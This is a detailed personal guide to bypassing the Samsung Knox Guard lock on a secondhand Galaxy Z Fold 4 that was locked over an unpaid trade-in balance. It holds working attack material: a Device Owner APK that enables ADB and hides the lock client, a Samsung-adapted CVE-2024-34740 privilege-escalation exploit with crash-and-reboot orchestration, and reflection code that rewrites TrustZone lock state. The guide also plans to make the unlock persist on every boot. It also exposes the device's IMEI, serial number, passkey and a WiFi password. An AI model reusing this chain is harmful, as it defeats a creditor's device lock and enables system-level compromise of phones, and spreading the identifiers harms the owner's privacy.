# Samsung Galaxy Z Fold 4 (SM-F936U1) Knox Guard Unlock Guide

**Project status:** In progress (factory reset pending as of March 19, 2026)
**Author:** kyin
**Date range:** March 18-19, 2026

---

## Table of Contents

1. [Device Information](#device-information)
2. [Background: What is Knox Guard?](#background-what-is-knox-guard)
3. [Phase 1: Initial Recon and Dead Ends](#phase-1-initial-recon-and-dead-ends)
4. [Phase 2: Getting ADB Access via QR Provisioning](#phase-2-getting-adb-access-via-qr-provisioning)
5. [Phase 3: Failed KG Removal Attempts via ADB](#phase-3-failed-kg-removal-attempts-via-adb)
6. [Phase 4: CVE-2024-34740 (AbxOverflow) Exploit](#phase-4-cve-2024-34740-abxoverflow-exploit)
7. [Phase 5: KG Service Exploitation via UID 1000 Reflection](#phase-5-kg-service-exploitation-via-uid-1000-reflection)
8. [Phase 6: TrustZone RPMB State Manipulation](#phase-6-trustzone-rpmb-state-manipulation)
9. [Phase 7: The 8133 Error and Re-enabling kgclient](#phase-7-the-8133-error-and-re-enabling-kgclient)
10. [Phase 8: ADB Lost, Factory Reset](#phase-8-adb-lost-factory-reset)
11. [Current State and Next Steps](#current-state-and-next-steps)
12. [Knox Guard Architecture Reference](#knox-guard-architecture-reference)
13. [Tool Inventory](#tool-inventory)
14. [Appendix: Full Source Code](#appendix-full-source-code)

---

## Device Information

| Field | Value |
|-------|-------|
| Model | Samsung Galaxy Z Fold 4 |
| Model Number | SM-F936U1 (US unlocked) |
| Carrier | XAA |
| IMEI | 356954474735469 |
| Serial | RFCW2006DLA |
| Passkey | 23198483 |
| Firmware | F936U1UES3CWF3 |
| Android Version | 13 |
| Build Date | June 2023 |
| Security Patch Level | July 2023 |
| Bootloader | BIT 3, SECURE DOWNLOAD ENABLE |
| Chipset | Qualcomm Snapdragon 8+ Gen 1 (SM8475) |
| KG Status | LOCKED (01), FRP LOCK ON |
| KG Reason | "balance due for failure to meet trade-in terms" |
| WiFi | SSID: coconutWater / Password: 9093255140 |

The phone was bought secondhand and arrived Knox Guard locked. KG activates from **cached local state** within 1-2 seconds of boot, regardless of internet connectivity. This is a critical fact that invalidates many common "block the server" approaches.

---

## Background: What is Knox Guard?

Knox Guard (KG) is Samsung's enterprise device management lock. When active, it:

- Displays a full-screen lock overlay that blocks all interaction
- Disables USB debugging
- Prevents access to Settings, Developer Options, and most system features
- Survives factory resets (state stored in TrustZone RPMB)
- Has a hardware OTP fuse (`ro.boot.kg.bit`) that persists permanently
- Checks integrity of its own client app (`com.samsung.android.kgclient`) on every boot

### KG State Machine (stored in TrustZone RPMB)

| State | Value | Meaning |
|-------|-------|---------|
| Prenormal | 0 | KG not yet activated |
| Checking | 1 | KG checking with server |
| Active | 2 | KG provisioned but not locked |
| Locked | 3 | KG actively locking device |
| Completed | 4 | KG obligations met, device released |
| Error | 5 | KG in error state |

### Key System Properties

- `knox.kg.state` - Human-readable KG state (set from RPMB on boot)
- `ro.boot.kg` - Boot property reflecting RPMB state (e.g., `0x3` = Locked)
- `ro.boot.kg.bit` - OTP fuse value (`01` = KG enabled, hardware fuse, cannot change)

### Key Files on Device

- `/system/framework/services.jar` - Contains KnoxGuardSeService and KnoxGuardNative classes (in classes3.dex)
- `/system/priv-app/KnoxGuard/KnoxGuard.apk` - The KG system service APK
- `/system/priv-app/KGClient/` or equivalent - The kgclient app (`com.samsung.android.kgclient`)
- `/data/system/packages.xml` - Package manager state (ABX format)
- `/data/system/install_sessions.xml` - PackageInstaller session state (ABX format)
- `/data/misc/adb/adb_keys` - Authorized ADB public keys

---

## Phase 1: Initial Recon and Dead Ends

### Everything That Was Tried and Failed

**Phone-side approaches (all blocked by KG overlay):**
- Samsung Knox support calls -- dead end for secondhand buyers
- Emergency dialer codes (`*#0808#`, `*#0*#`, `*#7353#`) -- blocked by emergency dialer
- Home screen race condition -- approximately 1-2 second window before KG overlay, too short
- Accessibility shortcuts (Power+Vol Up, Vol Up+Vol Down 3s) -- no response on KG screen
- USB keyboard via USB-C -- no response on KG screen
- Notification shade from Support menu -- tapping Settings redirects back to KG
- Volume buttons only work inside Support menu, not on main KG screen
- Airplane mode toggle during boot window -- KG overrides and reconnects
- Quick Share method -- needs Accessibility access
- Maintenance Mode -- requires Settings access
- Bixby/Google Assistant voice -- disabled by KG

**macOS USB/flash approaches (all blocked by Apple's CDC driver or SIP):**
- Heimdall (original 2017) -- protocol too old, handshake fails
- Heimdall (grimler fork, built from source) -- same handshake failure
- Thor (Samsung-Loki v1.1.0 macOS) -- binary broken, looks for /dev/bus/usb (Linux path)
- Custom Python pyusb Odin implementation -- USB write times out, CDC driver claims interface
- `sudo kextunload` CDC driver -- "kext is in use or retained" (SIP blocks)
- Heimdall kext install -- "package is attempting to install content to system volume" (SIP blocks)

**AT modem commands (limited by Samsung PACM):**

The modem IS accessible at `/dev/tty.usbmodemRFCW2006DLA2`. Connection via:
```bash
screen /dev/tty.usbmodemRFCW2006DLA2 115200
```

| Command | Result |
|---------|--------|
| `AT` | OK (modem alive) |
| `AT+DEVCONINFO` | Returns full device info (works) |
| `AT+SWATD=0` | Switches to DDEXE mode (works) |
| `AT+SYSSCOPE=1,0` | +SYSSCOPE:1,NORMAL (works) |
| `AT+USBDEBUG` | +USBDEBUG:1,NG_NONE (responds but doesn't enable ADB) |
| `AT+USBDEBUG=?` | EXISTS BUT BLOCKED by PACM |
| `AT+DEBUGLVC=0,5` | PROTECTED_NO_TOK (needs auth token) |
| `AT+ACTIVATE` | BLOCKED |
| 60+ other commands | All UNREGISTED or NOT_ALLOWED |

**ADB sideload (Recovery mode):**
- ADB detects phone in sideload mode (`RFCW2006DLA sideload`)
- `adb shell` -- "error: closed" (no shell access)
- `adb install` -- fails
- `adb sideload APK` -- signature verification failed (needs Samsung-signed OTA)

**VM approaches:**
- UTM/QEMU -- confirmed broken for USB passthrough on Apple Silicon (QEMU bug #2178)
- Parallels -- unverified for Samsung USB on Apple Silicon

**Services:**
- cleanimei.com -- Z Fold 4 KG removal SOLD OUT
- samsungtool.us -- device verified in their system but requires Windows

---

## Phase 2: Getting ADB Access via QR Provisioning

### The Breakthrough: Android Enterprise QR Provisioning

KG blocks everything on the phone, but during initial setup (factory reset state), the Setup Wizard runs before KG fully activates. Android Enterprise QR provisioning can install a Device Owner app during this window.

### Step 2.1: Build the Device Owner APK

Built a custom Device Owner APK (`com.kyin.adbenab`) that auto-enables ADB when provisioned as Device Owner.

**Location:** `/Users/kyin/adb_enabler/`

**Project structure:**
```
/Users/kyin/adb_enabler/
  AndroidManifest.xml
  src/com/kyin/adbenab/
    AdbEnableReceiver.java
    ProvisioningActivity.java
  res/xml/device_admin.xml
  debug.keystore
  adbenab.apk (final signed APK)
```

**AndroidManifest.xml:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.kyin.adbenab"
    android:versionCode="1"
    android:versionName="1.0">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />

    <application android:label="ADB Enabler">
        <receiver
            android:name=".AdbEnableReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                <action android:name="android.app.action.PROFILE_PROVISIONING_COMPLETE" />
            </intent-filter>
        </receiver>

        <activity
            android:name=".ProvisioningActivity"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.app.action.GET_PROVISIONING_MODE" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.app.action.ADMIN_POLICY_COMPLIANCE" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**AdbEnableReceiver.java** -- on Device Owner activation:
1. Enables USB debugging via `dpm.setGlobalSetting(admin, Settings.Global.ADB_ENABLED, "1")`
2. Enables developer options via `dpm.setGlobalSetting(admin, "development_settings_enabled", "1")`
3. Hides KG client via `dpm.setApplicationHidden(admin, "com.samsung.android.kgclient", true)`
4. Suspends KG packages via `dpm.setPackagesSuspended(admin, kgPackages, true)`

**ProvisioningActivity.java** -- handles Android 12+ provisioning flow:
1. `GET_PROVISIONING_MODE` intent: returns fully managed device mode (mode=1)
2. `ADMIN_POLICY_COMPLIANCE` intent: enables ADB, dev options, hides kgclient, disables `adb_secure`, disables keyguard
3. **Critical:** Pre-loads the Mac's ADB public key directly into `/data/misc/adb/adb_keys` so ADB connects without authorization prompt

The ADB public key embedded in the APK:
```
QAAAAGtQkEK9I+Lm2BwdtfIehupqAwFYIugSIEzGmrYfBe14...kyin@Kevins-MacBook-Pro-2.local
```

### Step 2.2: Build the APK (no Android Studio required)

```bash
cd /Users/kyin/adb_enabler

# Set up Android SDK paths
export ANDROID_HOME=/opt/homebrew/share/android-commandlinetools
export BUILD_TOOLS=$ANDROID_HOME/build-tools/33.0.2
export PLATFORM=$ANDROID_HOME/platforms/android-33

# Compile resources
$BUILD_TOOLS/aapt2 compile --dir res -o compiled_res.zip

# Link resources
$BUILD_TOOLS/aapt2 link compiled_res.zip \
  -I $PLATFORM/android.jar \
  --manifest AndroidManifest.xml \
  --java gen \
  -o intermediate.apk

# Compile Java
mkdir -p classes
javac -source 1.8 -target 1.8 \
  -cp $PLATFORM/android.jar \
  -d classes \
  src/com/kyin/adbenab/*.java gen/com/kyin/adbenab/R.java

# Create DEX
mkdir -p dex_output
$BUILD_TOOLS/d8 classes/com/kyin/adbenab/*.class \
  --output dex_output \
  --lib $PLATFORM/android.jar

# Package APK
cp intermediate.apk unsigned.apk
cd dex_output && zip -u ../unsigned.apk classes.dex && cd ..

# Align
$BUILD_TOOLS/zipalign -f 4 unsigned.apk aligned.apk

# Sign (create keystore if needed)
keytool -genkey -v -keystore debug.keystore -alias key0 \
  -keyalg RSA -keysize 2048 -validity 10000 \
  -storepass android -keypass android \
  -dname "CN=Debug"

$BUILD_TOOLS/apksigner sign \
  --ks debug.keystore --ks-pass pass:android \
  --key-pass pass:android --ks-key-alias key0 \
  --out adbenab.apk aligned.apk
```

### Step 2.3: Serve the APK

```bash
mkdir -p /Users/kyin/Downloads/serve_apk
cp /Users/kyin/adb_enabler/adbenab.apk /Users/kyin/Downloads/serve_apk/
cd /Users/kyin/Downloads/serve_apk
python3 -m http.server 8888
```

APK URL: `http://192.168.4.125:8888/adbenab.apk`

### Step 2.4: Generate QR Code

The QR code must contain a JSON provisioning payload with:
- WiFi credentials
- APK download URL
- APK checksum (SHA-256 of the APK file)
- Device owner component name
- Skip encryption flag

```bash
# Get APK checksum
sha256sum /Users/kyin/Downloads/serve_apk/adbenab.apk
```

Generate QR code with the provisioning JSON:
```json
{
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME": "com.kyin.adbenab/.AdbEnableReceiver",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION": "http://192.168.4.125:8888/adbenab.apk",
  "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_CHECKSUM": "<SHA256_BASE64_URL_SAFE>",
  "android.app.extra.PROVISIONING_WIFI_SSID": "coconutWater",
  "android.app.extra.PROVISIONING_WIFI_PASSWORD": "9093255140",
  "android.app.extra.PROVISIONING_WIFI_SECURITY_TYPE": "WPA",
  "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": true
}
```

### Step 2.5: Provision the Phone

1. Factory reset the phone (or have it in fresh setup state)
2. On the WiFi setup screen, tap 6 times on the screen to open the QR scanner
3. Scan the QR code
4. Phone connects to WiFi, downloads APK, installs as Device Owner
5. `AdbEnableReceiver.onProfileProvisioningComplete()` fires
6. `ProvisioningActivity` handles `ADMIN_POLICY_COMPLIANCE`
7. ADB is enabled, ADB key pre-loaded, KG client hidden/suspended

### Step 2.6: Verify ADB

```bash
/opt/homebrew/bin/adb devices
# Should show: RFCW2006DLA    device

/opt/homebrew/bin/adb shell id
# uid=2000(shell) gid=2000(shell)
```

**ADB persists through reboots** because the ADB public key was written to `/data/misc/adb/adb_keys` by the Device Owner APK.

---

## Phase 3: Failed KG Removal Attempts via ADB

With ADB access, several approaches were tried to remove KG. All failed.

### 3.1: pm disable-user on kgclient (DO NOT DO THIS)

```bash
adb shell pm disable-user --user 0 com.samsung.android.kgclient
```

**Result:** Triggered **error 8133** (abnormal detection). This error is a bitfield computed dynamically every boot by checking if kgclient and its 6 components are enabled. Disabling the app sets all bits, producing 8133.

**THIS IS THE WORST THING YOU CAN DO.** It creates a visible error code on the KG lock screen that makes the situation harder to recover from. The error persists until kgclient and all 6 components are re-enabled.

### 3.2: service call knoxguard_service (permission denied)

```bash
adb shell service call knoxguard_service 36
# Error: does not have com.samsung.android.knoxguard.STATUS
```

Service calls to knoxguard_service require the caller to have UID 1000 (system) or the `com.samsung.android.knoxguard.STATUS` permission. ADB shell runs as UID 2000 (shell), which has neither.

**Important correction:** Early research incorrectly suggested TX 36 was a "disable KG" command. It's actually `isVpnExceptionRequired()`. TX 22 (`unlockScreen`) is the real unlock, but it still requires UID 1000 permissions.

### 3.3: Samsung TTS/FTL Exploit Chain

The TTS (Text-to-Speech) exploit chain requires downgrading the Samsung TTS app to a vulnerable version. This phone's July 2023 SPL prevents TTS downgrade -- the package manager rejects older TTS APKs.

### 3.4: CVE-2024-31317 (Zygote Injection)

This exploit targets the Zygote process to gain system-level code execution. **Failed on Samsung Android 13** -- Samsung's modifications to the Zygote launch flow prevent the injection from working.

---

## Phase 4: CVE-2024-34740 (AbxOverflow) Exploit

### Overview

CVE-2024-34740 is an Android Binary XML (ABX) integer overflow vulnerability in `BinaryXmlSerializer.attributeBytesBase64()`. When writing a byte array of exactly 65536 bytes, the length field overflows to 0 via `writeShort()`, causing the array contents to be interpreted as raw ABX tokens on the next read.

This allows injecting arbitrary XML content into `install_sessions.xml`, which can be used to:
1. Create a PackageInstaller session with a tampered `stageDir` pointing to `/data/system`
2. Create another session with `stageDir` pointing to `/data/app/dropped_apk`
3. Use these sessions to write a new APK and patch `packages.xml` to register it as `sharedUserId="1000"` (system)
4. After two system_server crashes and reboots, the dropped APK runs as UID 1000 inside system_server

**Source:** https://github.com/michalbednarski/AbxOverflow
**CVE:** CVE-2024-34740 / A-307288067
**Patched in:** August 2024 security bulletin
**Affected:** This phone (July 2023 SPL) is vulnerable

### Step 4.1: Build the Exploit

**Location:** `/Users/kyin/Downloads/AbxOverflow/`

```bash
cd /Users/kyin/Downloads/AbxOverflow

# Set Java 17
export JAVA_HOME=/opt/homebrew/opt/openjdk@17

# Ensure local.properties has SDK path
echo "sdk.dir=/opt/homebrew/share/android-commandlinetools" > local.properties

# Gradle wrapper is configured to use Gradle 8.5
# build.gradle uses Android Gradle Plugin 8.1.0

# Build droppedapk first (release, since it gets embedded as asset)
./gradlew :droppedapk:assembleRelease

# Move built droppedapk into app's assets
bash utils/moveapk.sh

# Build the main exploit app
./gradlew :app:assembleDebug
```

**Output APK:** `app/build/outputs/apk/debug/app-debug.apk`

### Step 4.2: Key Modifications for Samsung

The original exploit assumes a "userspace reboot" after system_server crashes. Samsung does a **FULL reboot** instead, which kills the `RebootBackgroundRunner` process (even though it calls `setsid()`). This required two changes:

**1. Mac-side orchestration:** Instead of the background runner surviving the reboot, a Mac-side script (`run_exploit.sh`) polls ADB between reboots and relaunches the app for each stage.

**2. Stage-aware MainActivity:** Modified `app/src/main/java/com/example/abxoverflow/MainActivity.java` to accept `--ei stage N` intent extras from ADB, allowing the Mac to control which stage runs:

```java
// Mac controls which stage via intent extra:
//   adb shell am start -n .../.MainActivity --ei stage 1
//   adb shell am start -n .../.MainActivity --ei stage 2
Intent intent = getIntent();
int stage = intent.getIntExtra("stage", 0);

if (stage > 0) {
    new Thread(() -> {
        try {
            if (stage == 1) {
                Main.stage1(MainActivity.this);
                Main.crashSystemServer();
            } else if (stage == 2) {
                Main.stage2(MainActivity.this);
                Main.crashSystemServer();
            }
        } catch (Exception e) { ... }
    }).start();
}
```

**3. --activity-clear-task flag:** After the first reboot, the app's Thread in `onCreate()` produced ZERO logs. The fix was using `--activity-clear-task` flag when launching via `adb shell am start` to force fresh Activity creation.

### Step 4.3: The droppedapk

The dropped APK (`com.example.abxoverflow.droppedapk`) is the payload that gets installed as UID 1000. Key attributes in its `AndroidManifest.xml`:

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:sharedUserId="android.uid.system">
    <application
        android:process="system"
        ...>
```

- `android:sharedUserId="android.uid.system"` -- requests to run under UID 1000
- `android:process="system"` -- requests to be loaded into the system_server process (required because SELinux has no seapp_contexts rule for `user=system seinfo=default`)
- Has a `BOOT_COMPLETED` receiver (`LaunchReceiver`) that auto-starts after reboot

### Step 4.4: How the Exploit Works (detailed flow)

**Stage 1 (ABX injection):**

1. App creates a `PackageInstaller.Session` and sets a `Checksum` object with a carefully crafted 65536-byte payload
2. The payload contains raw ABX tokens that, when parsed, create two fake sessions:
   - Session A: `sessionStageDir="/data/system"`, `prepared="true"` (directory exists, don't create)
   - Session B: `sessionStageDir="/data/app/dropped_apk"`, `prepared="false"` (will be created on first use)
3. A second dummy session is created and immediately abandoned to trigger `install_sessions.xml` to be written
4. After a delay, `crashSystemServer()` is called (via a `Parcelable` chain using `IAlarmManager.set()` -> `AlarmClockInfo` -> `PackageParser$Activity` -> `PooledStringWriter` -> SIGSEGV on read-only Binder memory)
5. System reboots

**Stage 2 (packages.xml patch + APK drop):**

1. After reboot, Mac's `run_exploit.sh` detects ADB is back and launches stage 2
2. Using Session B (tampered `stageDir="/data/app/dropped_apk"`): extracts `droppedapk-release.apk` from app assets and writes it as `base.apk`
3. Using Session A (tampered `stageDir="/data/system"`): reads `packages.xml` via `openRead()`, converts from ABX to regular XML using `abx2xml`, patches it to:
   - Add a new `<package>` entry for `com.example.abxoverflow.droppedapk` with `sharedUserId="1000"` and `codePath="/data/app/dropped_apk"`
   - Add the droppedapk's signing certificate to the `<shared-user name="android.uid.system" userId="1000">` element's `<pastSigs>` (duplicated twice with `flags="2"` because the last pastSig is ignored as "current")
   - Allocate new keyset identifiers for the certificate
4. Writes the patched XML as `packages-backup.xml` in `/data/system`
5. Crashes system_server again

**After second reboot:**
- System sees `packages-backup.xml` exists, considers `packages.xml` corrupted, reads backup instead
- droppedapk is registered as installed with `sharedUserId="1000"`
- On `BOOT_COMPLETED`, `LaunchReceiver` starts `MainActivity`, which runs inside system_server process as UID 1000

### Step 4.5: The Orchestration Script

**File:** `/Users/kyin/Downloads/AbxOverflow/run_exploit.sh`

```bash
#!/bin/bash
ADB="/opt/homebrew/bin/adb"
PKG="com.example.abxoverflow"
DROPPED="com.example.abxoverflow.droppedapk"

# Stage 1: Launch with --ei stage 1, wait for crash + reboot
$ADB shell am start -n "$PKG/.MainActivity" --ei stage 1

# Poll for ADB to come back after reboot
# (wait_adb polls every 1s for up to 180s)
# (wait_boot polls sys.boot_completed every 1s for up to 120s)

# Stage 2: Launch with --ei stage 2
$ADB shell am force-stop "$PKG"
$ADB shell am start -n "$PKG/.MainActivity" --ei stage 2 --activity-clear-task

# After second reboot, verify droppedapk is installed
$ADB shell pm list packages | grep droppedapk
```

### Step 4.6: Verifying Success

```bash
# Check if droppedapk is installed
adb shell pm list packages | grep droppedapk
# package:com.example.abxoverflow.droppedapk

# Verify UID 1000
adb shell dumpsys package com.example.abxoverflow.droppedapk | grep userId
# userId=1000, sharedUser=SharedUserSetting{... android.uid.system/1000}

# Launch droppedapk
adb shell am start -n com.example.abxoverflow.droppedapk/.MainActivity
```

### Step 4.7: Rebuilding droppedapk

A key property of this exploit: **droppedapk can be rebuilt and reinstalled with `adb install -r`** and it retains UID 1000 status. This is because the signing certificate (from the debug keystore at `/Users/kyin/Downloads/AbxOverflow/droppedapk/`) matches what was registered in `packages.xml`. As long as you sign with the same keystore, reinstalls preserve the UID.

```bash
# Rebuild droppedapk with changes
cd /Users/kyin/Downloads/AbxOverflow
./gradlew :droppedapk:assembleDebug

# Reinstall (preserves UID 1000)
adb install -r droppedapk/build/outputs/apk/debug/droppedapk-debug.apk
```

---

## Phase 5: KG Service Exploitation via UID 1000 Reflection

With droppedapk running as UID 1000 inside system_server, we can use Java reflection to call any method on any system service without permission checks.

### Step 5.1: Service Method Discovery (v4 build)

The droppedapk's `MainActivity.callKnoxGuardService()` method uses reflection to:
1. Get the `knoxguard_service` binder via `ServiceManager.getService("knoxguard_service")`
2. List all methods on the service class
3. Call methods directly via reflection (bypasses Binder permission checks because we're in the same process)

**Key methods discovered on KnoxGuardSeService:**
- `setRemoteLockToLockscreen(boolean)` -- controls KG lock overlay
- `unlockCompleted()` -- marks unlock as complete
- `unbindFromLockScreen()` -- unbinds KG from the lock screen
- `unlockScreen()` -- wraps native unlock + extra logic
- `resetRPMB()` -- attempts to reset RPMB state (permission checked separately)
- `removeActiveAdmin(ComponentName)` -- removes device admin
- `lockScreen(...)` -- locks the screen
- `getTAState()` -- gets TrustZone TA state
- `setCheckingState()` -- sets checking state

### Step 5.2: Direct Method Calls (v5 build)

Called these methods via reflection from droppedapk:

```java
// Get the service object (not the binder proxy -- the actual implementation in our process)
Class<?> sm = Class.forName("android.os.ServiceManager");
Object kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");

// setRemoteLockToLockscreen(false) -- clears KG lock overlay
Method m = kgService.getClass().getDeclaredMethod("setRemoteLockToLockscreen", boolean.class);
m.setAccessible(true);
m.invoke(kgService, false);
// Result: OK! Lock overlay cleared

// unlockCompleted() -- marks unlock complete
Method m2 = kgService.getClass().getDeclaredMethod("unlockCompleted");
m2.setAccessible(true);
m2.invoke(kgService);
// Result: OK!

// unbindFromLockScreen()
Method m3 = kgService.getClass().getDeclaredMethod("unbindFromLockScreen");
m3.setAccessible(true);
m3.invoke(kgService);
// Result: OK!
```

**Result:** Error 8133 was CLEARED. The regular KG lock was visible instead of the abnormal detection error. This was progress but not a permanent fix -- the lock returns after reboot because KG state lives in TrustZone RPMB.

---

## Phase 6: TrustZone RPMB State Manipulation

### Step 6.1: Research Discovery

A research agent discovered the `KnoxGuardNative` class inside `services.jar` (classes3.dex). This class provides JNI methods that talk directly to the TrustZone Trusted Application (TA) that manages KG state in RPMB:

- `tz_getTAState(int)` -- reads current TA state from RPMB
- `tz_unlockScreen(int)` -- tells TA to unlock
- `tz_lockScreen(int)` -- tells TA to lock
- `tz_userChecking(int)` -- sets checking state
- `tz_resetRPMB(int)` or `tz_resetRPMB(int, byte[])` -- resets RPMB data

### Step 6.2: Classloader Fix (v7 build)

Initial attempt to load `KnoxGuardNative` via `Class.forName()` failed with `ClassNotFoundException`. The class is not in the boot classpath -- it's in `services.jar` alongside `KnoxGuardSeService`.

**Fix:** Use the service's own classloader:

```java
private Class<?> getKGNativeClass() throws ClassNotFoundException {
    Class<?> sm = Class.forName("android.os.ServiceManager");
    Object kgService = sm.getMethod("getService", String.class).invoke(null, "knoxguard_service");
    ClassLoader cl = kgService.getClass().getClassLoader();
    return cl.loadClass("com.samsung.android.knoxguard.service.KnoxGuardNative");
}
```

### Step 6.3: TrustZone Native Calls (v8-v9 builds)

The native methods return `KgErrWrapper` objects, not simple integers. Used reflection to unwrap them:

```java
private String unwrapKgErr(Object kgService, Object wrapper) {
    // Try getIntResult on the service
    Method m = kgService.getClass().getDeclaredMethod("getIntResult", wrapper.getClass());
    m.setAccessible(true);
    Object intResult = m.invoke(kgService, wrapper);
    // Also dump all fields: data, err, result, KGTA_FAILED, KGTA_PARAM_DEFAULT, TAG
    for (Field f : wrapper.getClass().getDeclaredFields()) {
        f.setAccessible(true);
        // ...
    }
}
```

**Results:**

| Call | Result |
|------|--------|
| `tz_getTAState(0)` BEFORE | `int=3` (Locked) |
| `tz_unlockScreen(0)` | `err=0, result=0` (SUCCESS) |
| `tz_userChecking(0)` | `err=262` (failed, doesn't matter) |
| `tz_resetRPMB(0)` (v9) | `err=0, result=0` (SUCCESS) |
| `tz_getTAState(0)` AFTER | `int=2` (Active) |

**The TA state changed from Locked(3) to Active(2) in RPMB.**

After reboot: `ro.boot.kg` changed from `0x3` to `0x2` -- this persists through reboots because it's stored in RPMB (TrustZone hardware-backed storage).

### Step 6.4: Additional Service-Level Actions

In addition to the TrustZone calls, v10 of droppedapk also:

1. **Unregistered KG boot receivers:**
```java
Field receiverField = kgService.getClass().getDeclaredField("mSystemReceiver");
receiverField.setAccessible(true);
Object receiver = receiverField.get(kgService);
ctx.unregisterReceiver((BroadcastReceiver) receiver);
receiverField.set(kgService, null);
// Same for mServiceSystemReceiver
```

2. **Set system property:**
```java
Class<?> sysProp = Class.forName("android.os.SystemProperties");
Method set = sysProp.getMethod("set", String.class, String.class);
set.invoke(null, "knox.kg.state", "Completed");
```

3. **Attempted to clear Device Owner:**
```java
// Failed -- DPM service binder doesn't have this$0 field on Samsung
```

4. **Re-enabled kgclient:**
```java
Object pmBinder = sm.getMethod("getService", String.class).invoke(null, "package");
Method setEnabled = pmBinder.getClass().getDeclaredMethod(
    "setApplicationEnabledSetting",
    String.class, int.class, int.class, int.class, String.class);
setEnabled.setAccessible(true);
setEnabled.invoke(pmBinder, "com.samsung.android.kgclient", 1, 0, 0, "android");
```

---

## Phase 7: The 8133 Error and Re-enabling kgclient

### The 8133 Error Explained

Error 8133 is a **bitfield** computed dynamically on every boot by `IntegritySeUtil.checkKGClientIntegrityAndEnableComponentsWithFlag()`. It is NOT stored anywhere -- it's freshly calculated by checking if kgclient and its 6 components are enabled:

| Bit | Component | Value |
|-----|-----------|-------|
| CLIENT_INTEGRITY_BASE2 | kgclient app itself | 8192 (0x2000) |
| ENABLED | App enabled state | (included in base) |
| ADMIN_RECEIVER | KGDeviceAdminReceiver | (bit flag) |
| SYSTEM_INTENT_RECEIVER | SystemIntentReceiver | (bit flag) |
| SELFUPDATE_RECEIVER | SelfupdateReceiver | (bit flag) |
| KG_EVENT_SERVICE | KGEventService | (bit flag) |
| ALARM_SERVICE | AlarmService | (bit flag) |
| KG_PROVIDER | KGProvider | (bit flag) |

Our earlier `pm disable-user` disabled the app AND all 6 components, setting every bit and producing 8133.

**IntegritySeUtil also checks:**
- Signature validation against Android platform signature
- Minimum version code >= 300000000
- All six core components enabled
- FLAG_SYSTEM set on app
- TA integrity via RPMB and HMAC

### The Fix

Re-enable kgclient and all its components so the integrity check passes:

```bash
adb shell pm enable com.samsung.android.kgclient
```

Plus, from droppedapk (UID 1000), calling `setApplicationEnabledSetting` via PackageManagerService reflection.

**After reboot with kgclient re-enabled:** 8133 and 3001 errors GONE. First clean boot.

### The Problem

With kgclient re-enabled and running cleanly, it booted and checked its **cached lock policy**. Even though TA state was Active(2) and `handleBootCompleted` skipped `bindAndSetToLockScreen` (because state != 3/Locked), kgclient's own `BOOT_COMPLETED` receiver ran a separate code path that contacted Samsung servers or read cached policy and **RE-LOCKED the device**.

This re-lock also disabled USB debugging, which killed ADB access.

---

## Phase 8: ADB Lost, Factory Reset

### How ADB Was Lost

When kgclient was re-enabled and the phone rebooted:
1. kgclient booted cleanly (no integrity errors)
2. kgclient's BOOT_COMPLETED receiver ran
3. kgclient read its cached lock policy
4. kgclient re-locked the device AND disabled USB debugging
5. ADB daemon stopped accepting connections

**Verification:**
- Phone still visible on USB (confirmed via `ioreg`)
- AT modem still accessible at `/dev/tty.usbmodemRFCW2006DLA2`
- But `adb devices` shows nothing

### Factory Reset Decision

With ADB lost, the decision was made to factory reset. The reasoning:

**What factory reset preserves:**
- RPMB state: TA state stays at **Active(2)** -- this is the key achievement
- OTP fuse: `ro.boot.kg.bit` stays at `01` (hardware, cannot change regardless)

**What factory reset wipes:**
- `/data` partition: all apps, settings, user data, packages.xml
- droppedapk installation
- Device Owner provisioning
- Cached KG lock policies

**Expected behavior after factory reset:**
1. Phone boots to Setup Wizard
2. kgclient starts fresh -- default enabled, no tampering evidence, all components intact
3. Integrity check passes (no 8133)
4. `handleBootCompleted` checks TA state: **2 != 3** -> **SKIP lock binding**
5. Phone should boot without KG lock

**Risk:** kgclient may contact Samsung servers during WiFi setup and receive a fresh lock command, transitioning TA state back to Locked(3).

---

## Current State and Next Steps

### Current State (as of March 19, 2026)

| Property | Value |
|----------|-------|
| TA State (RPMB) | **2 (Active)** -- permanent, survives factory reset |
| OTP Fuse | **01** (KG enabled -- hardware fuse, permanent) |
| `ro.boot.kg` | **0x2** |
| ADB | Lost (kgclient disabled USB debugging before factory reset) |
| droppedapk | Was installed, will be wiped by factory reset |
| Factory Reset | In progress |

### Scenario A: Factory Reset Works

If the phone boots to Setup Wizard without KG lock:
1. Set up phone normally
2. Avoid connecting to WiFi during setup if possible (prevent Samsung server contact)
3. If WiFi is required, use the DNS blocker on Mac first:
   ```bash
   sudo python3 /Users/kyin/kg_block_dns.py
   ```
   Set phone's DNS to Mac's IP during WiFi setup
4. KG should remain in Active(2) state without locking

### Scenario B: Factory Reset Doesn't Work (kgclient re-locks)

If kgclient contacts Samsung and receives a lock command:

1. **Re-provision via QR code** (we've done this before -- see Phase 2)
2. **Rebuild and re-run AbxOverflow exploit** (see Phase 4)
3. **Modify droppedapk to be fully autonomous:**
   - Add a `BOOT_COMPLETED` BroadcastReceiver (already exists as `LaunchReceiver`)
   - Instead of starting an Activity, run the full KG unlock sequence directly in the receiver:
     - `tz_unlockScreen(0)`
     - `tz_resetRPMB(0)`
     - `setRemoteLockToLockscreen(false)`
     - `unlockCompleted()`
     - `unbindFromLockScreen()`
   - This way, on every boot, droppedapk automatically clears KG before kgclient can re-lock
4. **Alternative: Move TA state to Completed(4) or Prenormal(0)**
   - Currently at Active(2), which still allows kgclient to re-lock
